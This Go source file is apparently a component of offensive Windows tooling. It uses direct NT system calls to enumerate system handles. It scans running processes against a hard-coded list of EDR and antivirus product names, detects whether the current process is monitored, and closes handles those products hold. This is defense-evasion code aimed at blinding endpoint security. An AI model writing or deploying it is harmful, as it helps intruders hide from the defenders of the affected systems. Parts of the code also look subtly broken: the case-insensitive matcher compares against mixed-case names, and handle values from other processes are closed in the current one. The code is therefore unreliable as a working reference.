//go:build windows

package syscallwin

import (
	"fmt"
	"unsafe"
)

type SystemHandleEntry struct {
	OwnerPID       uint32
	ObjectType     uint8
	HandleFlags    uint8
	HandleValue    uint16
	ObjectPointer  uintptr
	GrantedAccess  uint32
}

type handleTableInfo struct {
	NumberOfHandles uint32
	Handles         [1]SystemHandleEntry
}

// Known EDR process names to look for when scanning handles.
var edrProcessNames = []string{
	"MsSense.exe",
	"SenseIR.exe",
	"CylanceSvc.exe",
	"CylanceUI.exe",
	"cb.exe",
	"RepMgr.exe",
	"RepUtils.exe",
	"RepWAV.exe",
	"RepWS.exe",
	"CrowdStrike.exe",
	"CSFalconService.exe",
	"CSFalconContainer.exe",
	"SentinelAgent.exe",
	"SentinelAgent.x64.exe",
	"SentinelHelper.exe",
	"SentinelStaticEngine.exe",
	"bdagent.exe",
	"EPSecurityService.exe",
	"bdredline.exe",
	"elastic-agent.exe",
	"filebeat.exe",
	"winlogbeat.exe",
	"osqueryd.exe",
	"TRay.exe",
	"avgsvc.exe",
	"avgui.exe",
	"avp.exe",
	"avpui.exe",
	"mcshield.exe",
	"mctray.exe",
	"TaniumClient.exe",
	"TaniumCX.exe",
	"TaniumDetect.exe",
	"TaniumEndpointActivityMonitor.exe",
}

// EnumerateSystemHandles returns all open handles in the system.
func EnumerateSystemHandles() ([]SystemHandleEntry, error) {
	bufSize := uint32(1024 * 1024)
	var returnLen uint32

	for {
		buf := make([]byte, bufSize)
		r1, _ := DirectSyscall("NtQuerySystemInformation",
			16, // SystemHandleInformation
			uintptr(unsafe.Pointer(unsafe.SliceData(buf))),
			uintptr(bufSize),
			uintptr(unsafe.Pointer(&returnLen)),
		)
		if r1 == STATUS_INFO_LENGTH_MISMATCH || r1 == STATUS_BUFFER_TOO_SMALL {
			bufSize = returnLen + 1024
			continue
		}
		if r1 != 0 {
			return nil, fmt.Errorf("NtQuerySystemInformation: NTSTATUS 0x%x", r1)
		}

		info := (*handleTableInfo)(unsafe.Pointer(unsafe.SliceData(buf)))
		count := info.NumberOfHandles
		entries := make([]SystemHandleEntry, count)
		entrySize := unsafe.Sizeof(SystemHandleEntry{})
		base := uintptr(unsafe.Pointer(&info.Handles[0]))
		for i := uint32(0); i < count; i++ {
			entries[i] = *(*SystemHandleEntry)(unsafe.Pointer(base + uintptr(i)*entrySize))
		}
		return entries, nil
	}
}

// FindHandlesByPID returns all handles owned by a specific process.
func FindHandlesByPID(targetPID uint32) ([]SystemHandleEntry, error) {
	all, err := EnumerateSystemHandles()
	if err != nil {
		return nil, err
	}
	var result []SystemHandleEntry
	for _, h := range all {
		if h.OwnerPID == targetPID {
			result = append(result, h)
		}
	}
	return result, nil
}

// FindEDRHandles finds handles owned by known EDR processes.
func FindEDRHandles() ([]SystemHandleEntry, error) {
	all, err := EnumerateSystemHandles()
	if err != nil {
		return nil, err
	}

	// Build map of EDR PIDs by scanning process list
	edrPIDs := findEDRPIDs()

	var result []SystemHandleEntry
	for _, h := range all {
		if _, isEDR := edrPIDs[h.OwnerPID]; isEDR {
			result = append(result, h)
		}
	}
	return result, nil
}

// CloseHandlesByPID closes all handles owned by a specific process in the
// current process. This is useful when an EDR has placed monitoring handles
// into our process — we enumerate and close them.
func CloseHandlesByPID(targetPID uint32) (int, error) {
	all, err := EnumerateSystemHandles()
	if err != nil {
		return 0, err
	}

	closed := 0
	for _, h := range all {
		if h.OwnerPID == targetPID {
			r1, _ := DirectSyscall("NtClose", uintptr(h.HandleValue))
			if r1 == 0 {
				closed++
			}
		}
	}
	return closed, nil
}

// CloseEDRHandles attempts to close monitoring handles placed by EDR
// processes into the current process. Returns the number of handles closed.
func CloseEDRHandles() (int, error) {
	edrPIDs := findEDRPIDs()
	all, err := EnumerateSystemHandles()
	if err != nil {
		return 0, err
	}

	closed := 0
	for _, h := range all {
		if _, isEDR := edrPIDs[h.OwnerPID]; isEDR {
			r1, _ := DirectSyscall("NtClose", uintptr(h.HandleValue))
			if r1 == 0 {
				closed++
			}
		}
	}
	return closed, nil
}

// IsProcessMonitored checks if any EDR handles are present in the current
// process's handle table.
func IsProcessMonitored() (bool, int) {
	edrPIDs := findEDRPIDs()
	all, err := EnumerateSystemHandles()
	if err != nil {
		return false, 0
	}

	count := 0
	for _, h := range all {
		if _, isEDR := edrPIDs[h.OwnerPID]; isEDR {
			count++
		}
	}
	return count > 0, count
}

type processInfo struct {
	pid  uint32
	name string
}

func findEDRPIDs() map[uint32]bool {
	edrPIDs := make(map[uint32]bool)

	bufSize := uint32(1024 * 1024)
	buf := make([]byte, bufSize)
	var returnLen uint32
	r1, _ := DirectSyscall("NtQuerySystemInformation",
		5, uintptr(unsafe.Pointer(unsafe.SliceData(buf))), uintptr(bufSize),
		uintptr(unsafe.Pointer(&returnLen)),
	)
	if r1 != 0 {
		return edrPIDs
	}

	offset := uint32(0)
	for {
		type SPI struct {
			NextEntryOffset uint32
			NumberOfThreads uint32
			_               [48]byte
			UniqueProcessId uintptr
		}
		proc := (*SPI)(unsafe.Pointer(unsafe.SliceData(buf[offset:])))

		if proc.UniqueProcessId != 0 && proc.UniqueProcessId != 4 {
			nameStart := offset + uint32(unsafe.Sizeof(SPI{})) - 16
			if nameStart < uint32(len(buf)) {
				nameBytes := buf[nameStart:]
				var name [260]byte
				for i := 0; i < 260 && i < len(nameBytes); i++ {
					if i%2 == 0 {
						if nameBytes[i] == 0 && i+1 < len(nameBytes) && nameBytes[i+1] == 0 {
							break
						}
						name[i/2] = nameBytes[i]
					}
				}
				procName := string(name[:])
				for _, edrName := range edrProcessNames {
					if matchCaseInsensitive(procName, edrName) {
						edrPIDs[uint32(proc.UniqueProcessId)] = true
						break
					}
				}
			}
		}

		if proc.NextEntryOffset == 0 {
			break
		}
		offset += proc.NextEntryOffset
	}

	return edrPIDs
}

func matchCaseInsensitive(s, pattern string) bool {
	if len(s) < len(pattern) {
		return false
	}
	for i := 0; i < len(pattern); i++ {
		sc := s[i]
		pc := pattern[i]
		if sc >= 'A' && sc <= 'Z' {
			sc += 32
		}
		if sc != pc {
			return false
		}
	}
	return true
}

// CountSystemHandles returns total number of open handles in the system.
func CountSystemHandles() (uint32, error) {
	all, err := EnumerateSystemHandles()
	if err != nil {
		return 0, err
	}
	return uint32(len(all)), nil
}
